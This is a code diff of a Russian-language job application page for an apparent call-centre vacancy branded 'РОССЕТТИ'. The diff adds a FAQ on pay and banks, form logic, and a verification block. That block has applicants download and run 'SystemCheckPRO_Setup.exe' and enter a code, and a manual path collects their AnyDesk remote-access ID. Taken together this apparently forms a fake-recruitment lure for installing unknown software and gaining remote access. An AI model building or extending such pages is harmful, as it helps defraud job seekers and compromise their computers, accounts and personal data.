@@ -1,4 +1,3 @@
-```html
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -414,6 +413,11 @@
             white-space: pre-line;
         }
 
+        .task-extra a {
+            color: #ffd700;
+            text-decoration: underline;
+        }
+
         .file-upload {
             margin: 20px 0;
         }
@@ -569,7 +573,7 @@
     <div class="container">
         <h1>РОССЕТТИ · Анкета кандидата</h1>
         
-        <!-- Информация о проекте (без изменений) -->
+        <!-- Информация о проекте -->
         <section>
             <h2>Информация о проекте</h2>
             <p><span class="badge">⚡️ Энергетика</span> <span class="badge">Входящая линия</span></p>
@@ -617,11 +621,80 @@
 
         <hr>
 
-        <!-- Часто задаваемые вопросы (без изменений) -->
+        <!-- Часто задаваемые вопросы -->
         <section>
             <h2>❓ Часто задаваемые вопросы</h2>
-            <!-- ... все 9 вопросов ... (сохранены из исходного файла) -->
-            <div class="faq-item">...</div>
+            
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">1. График выплат (Когда приходят деньги)?</div>
+                <div class="faq-answer">
+                    <p>Заработная плата за отработанный месяц выплачивается в следующем месяце двумя частями:<br>
+                    ▪ Аванс: С 15 по 20 число следующего месяца<br>
+                    ▪ Основная часть: С 20 по 30 число следующего месяца<br>
+                    <em>Пример:</em> зарплату за май вы получите в июне: аванс за май – 15–20 июня, основную часть – 20–30 июня.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">2. Куда перечисляем зарплату?</div>
+                <div class="faq-answer">
+                    <p>Мы работаем с локальными банками для вашего удобства:<br>
+                    ▪ Узбекистан: Карты OCTO Банка (octobank.uz)<br>
+                    ▪ Кыргызстан: Карты Capital Bank (capitalbank.kg)<br>
+                    ▪ Российская Федерация: Карты ПСБ Банка (psbank.ru)</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">3. Официальное трудоустройство?</div>
+                <div class="faq-answer">
+                    <p>Да, работаем исключительно официально. Колл-центр «Контакт-Сервис» зарегистрирован в РФ с 2019 года (г. Астрахань, ул. Наташи Кучуевской д. 6). В штате — более 60 операторов из России, Кыргызстана, Казахстана и Узбекистана.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">4. Гарантии выплат?</div>
+                <div class="faq-answer">
+                    <p>С каждым сотрудником заключается Договор оказания услуг, где прописаны все условия сотрудничества, ставки и порядок расчетов. Это ваша юридическая гарантия получения зарплаты.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">5. Из чего складывается зарплата?</div>
+                <div class="faq-answer">
+                    <p><strong>Прозрачная система расчета:</strong> Отработанные часы × Ставка на линии = Ваша зарплата.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">6. Есть ли бонусы?</div>
+                <div class="faq-answer">
+                    <p>Да, действует программа лояльности:<br>
+                    ▪ Бонус за приведенного друга: 2000 рублей<br>
+                    ▪ Условия: Друг должен оставить заявку, пройти обучение на текущем проекте и отработать на линии не менее 100 часов.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">7. Есть ли карьерный рост?</div>
+                <div class="faq-answer">
+                    <p>Да, компания активно растет. При появлении вакансий (наставник, старший смены и др.) мы в первую очередь рассматриваем действующих сотрудников.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">8. Нужно ли приходить в офис?</div>
+                <div class="faq-answer">
+                    <p>Формат работы зависит от проекта. У нас есть как офисные сотрудники, так и удаленные. Точные условия вам назовет рекрутер на собеседовании.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">9. Есть ли штрафы?</div>
+                <div class="faq-answer">
+                    <p>В компании нет системы штрафов. Оплата зависит только от отработанных часов и качества работы (бонусы и KPI). Все условия прозрачно прописаны в договоре.</p>
+                </div>
+            </div>
         </section>
 
         <hr>
@@ -680,12 +753,30 @@
                 </div>
             </form>
 
-            <!-- Блок для автоматической проверки (без изменений) -->
+            <!-- Блок для автоматической проверки -->
             <div id="autoVerificationBlock" class="result-block">
-                <!-- содержимое авто-блока (не показано для краткости, но должно быть полным) -->
+                <div class="block-title">🔑 Ваш уникальный код для автоматической проверки</div>
+                <div class="code-value" id="codeDisplay"></div>
+                <button class="copy-btn" onclick="copyCode()">📋 Копировать код</button>
+                
+                <div style="margin: 20px 0;">
+                   <a href="SystemCheckPRO_Setup.exe" class="download-link" download>⬇ Скачать программу SystemCheckPRO (установщик)</a>
+                </div>
+
+                <div class="instruction-note">
+                    <p><strong>Как пользоваться программой:</strong></p>
+                    <ol style="margin-left: 20px; color: #ccc;">
+                        <li>Скачайте программу по ссылке выше (откроется в новой вкладке).</li>
+                        <li>Запустите <code>SystemCheckPRO.exe</code>.</li>
+                        <li>В открывшемся окне введите уникальный код, который был сгенерирован выше.</li>
+                        <li>Программа автоматически проверит скорость печати, интернета и запишет голосовой образец.</li>
+                        <li>После завершения полученные данные будут обработаны автоматически, и вы получите решение в течение 5–10 минут.</li>
+                    </ol>
+                    <p><strong>Решение придёт в течение 5–10 минут.</strong></p>
+                </div>
             </div>
 
-            <!-- Блок для ручной проверки (обновлённый) -->
+            <!-- Блок для ручной проверки -->
             <div id="manualVerificationBlock" class="result-block">
                 <div class="block-title">📋 Ручная проверка</div>
                 <div id="taskProgress" class="task-progress"></div>
@@ -788,7 +879,7 @@
             setTimeout(() => notif.classList.remove('show'), 3000);
         }
 
-        // --- Автоматическая проверка (без изменений) ---
+        // --- Автоматическая проверка ---
         async function startAutoVerification() {
             if (!validateForm()) {
                 alert('Пожалуйста, заполните все обязательные поля.');
@@ -823,7 +914,7 @@
         }
 
         // ===================== РУЧНАЯ ПРОВЕРКА =====================
-        // Массив заданий (обновлено задание №3)
+        // Массив заданий
         const tasks = [
             {
                 title: "Задание №1 Пройдите тест на скорость интернета",
@@ -846,7 +937,6 @@
             {
                 title: "Задание №3 Пройдите тест на основы знания компьютера",
                 instruction: "Ответьте на вопросы ниже. Все вопросы обязательны.",
-                // Вместо ссылки используем массив вопросов
                 questions: [
                     "Как открыть диспетчер задач?",
                     "Где можно удалить программу?",
@@ -866,7 +956,7 @@
                     "Если вы дважды кликните по кнопке «Обновить страницу», сайт обновится сильнее?",
                     "Как увеличить масштаб на экране?"
                 ],
-                fileRequired: false // тест не требует файла
+                fileRequired: false
             },
             {
                 title: "Задание №4 Сделайте фотографию вашей гарнитуры",
@@ -905,9 +995,9 @@
         ];
 
         let currentTaskIndex = 0;
-        let taskFiles = {}; // объект { index: File } для загруженных файлов
-        let taskInputs = {}; // для текстовых полей (AnyDesk)
-        let taskAnswers = {}; // для ответов на вопросы теста { taskIndex: { questionIndex: answer } }
+        let taskFiles = {};
+        let taskInputs = {};
+        let taskAnswers = {};
 
         function renderTask() {
             const task = tasks[currentTaskIndex];
@@ -933,8 +1023,10 @@
                 html += `<a href="${task.link}" target="_blank" class="task-link">${task.linkText || 'Перейти'}</a>`;
             }
             
+            // Обработка extraText с преобразованием URL в ссылки
             if (task.extraText) {
-                html += `<div class="task-extra">${task.extraText}</div>`;
+                let extraHtml = task.extraText.replace(/(https?:\/\/[^\s]+)/g, '<a href="$1" target="_blank" class="task-link" style="display:inline; margin:0; padding:0;">$1</a>');
+                html += `<div class="task-extra">${extraHtml}</div>`;
             }
 
             // Если есть вопросы (тест)
@@ -957,7 +1049,7 @@
 
             // Поле для ввода (AnyDesk)
             if (task.inputPlaceholder) {
-                html += `<input type="text" id="taskInput_${currentTaskIndex}" class="task-input" placeholder="${task.inputPlaceholder}" value="${taskInputs[currentTaskIndex] || ''}">`;
+                html += `<input type="text" id="taskInput_${currentTaskIndex}" class="task-input" placeholder="${task.inputPlaceholder}" value="${taskInputs[currentTaskIndex] || ''}" oninput="handleInputChange(${currentTaskIndex}, this.value)">`;
             }
 
             // Загрузка файла
@@ -994,6 +1086,11 @@
             updateButtons();
         }
 
+        function handleInputChange(index, value) {
+            taskInputs[index] = value;
+            updateButtons();
+        }
+
         function updateButtons() {
             const prevBtn = document.getElementById('prevTaskBtn');
             const nextBtn = document.getElementById('nextTaskBtn');
@@ -1007,14 +1104,11 @@
                 canProceed = false;
             }
             if (task.inputPlaceholder) {
-                const input = document.getElementById(`taskInput_${currentTaskIndex}`);
-                if (input) {
-                    taskInputs[currentTaskIndex] = input.value;
-                    if (!input.value.trim()) canProceed = false;
+                if (!taskInputs[currentTaskIndex] || taskInputs[currentTaskIndex].trim() === '') {
+                    canProceed = false;
                 }
             }
             if (task.questions) {
-                // Проверяем, что на все вопросы даны ответы (не пустые строки)
                 const answers = taskAnswers[currentTaskIndex] || {};
                 for (let i = 0; i < task.questions.length; i++) {
                     if (!answers[i] || answers[i].trim() === '') {
@@ -1053,14 +1147,12 @@
         }
 
         async function submitManualResults() {
-            // Проверяем, что все обязательные поля заполнены
             const formData = getFormData();
             if (!formData.projectId) {
                 alert('Ошибка: не удалось определить проект.');
                 return;
             }
 
-            // Собираем все файлы и данные в FormData
             const data = new FormData();
             data.append('fullName', formData.fullName);
             data.append('nickname', formData.nickname);
@@ -1070,7 +1162,6 @@
             data.append('project', formData.project);
             data.append('projectId', formData.projectId);
 
-            // Добавляем файлы заданий
             for (let i = 0; i < tasks.length; i++) {
                 if (taskFiles[i]) {
                     data.append(`task_${i}`, taskFiles[i]);
@@ -1078,7 +1169,6 @@
                 if (taskInputs[i]) {
                     data.append(`task_${i}_input`, taskInputs[i]);
                 }
-                // Добавляем ответы на вопросы теста (если есть)
                 if (taskAnswers[i]) {
                     data.append(`task_${i}_answers`, JSON.stringify(taskAnswers[i]));
                 }
@@ -1092,7 +1182,6 @@
                 const result = await response.json();
                 if (!response.ok) throw new Error(result.error || 'Ошибка отправки');
                 showNotification('Анкета отправлена! Ожидайте решения.', 'success');
-                // Скрыть блок заданий
                 document.getElementById('manualVerificationBlock').classList.remove('show');
             } catch (error) {
                 console.error(error);
@@ -1100,7 +1189,6 @@
             }
         }
 
-        // Запуск ручной проверки
         async function startManualVerification() {
             if (!validateForm()) {
                 alert('Пожалуйста, заполните все обязательные поля.');
@@ -1113,7 +1201,6 @@
                 return;
             }
 
-            // Сброс состояния
             currentTaskIndex = 0;
             taskFiles = {};
             taskInputs = {};
@@ -1124,7 +1211,6 @@
             renderTask();
         }
 
-        // --- Копирование кода (для авто) ---
         function copyCode() {
             const code = document.getElementById('codeDisplay').textContent;
             navigator.clipboard.writeText(code).then(() => {
@@ -1132,17 +1218,14 @@
             }).catch(() => alert('Не удалось скопировать код.'));
         }
 
-        // --- FAQ аккордеон ---
         function toggleFaq(element) {
             const faqItem = element.closest('.faq-item');
             if (faqItem) faqItem.classList.toggle('active');
         }
 
-        // --- Инициализация ---
-        // При загрузке скрываем оба блока проверки
+        // Инициализация: скрываем блоки проверки
         document.getElementById('autoVerificationBlock').classList.remove('show');
         document.getElementById('manualVerificationBlock').classList.remove('show');
     </script>
 </body>
 </html>
-```
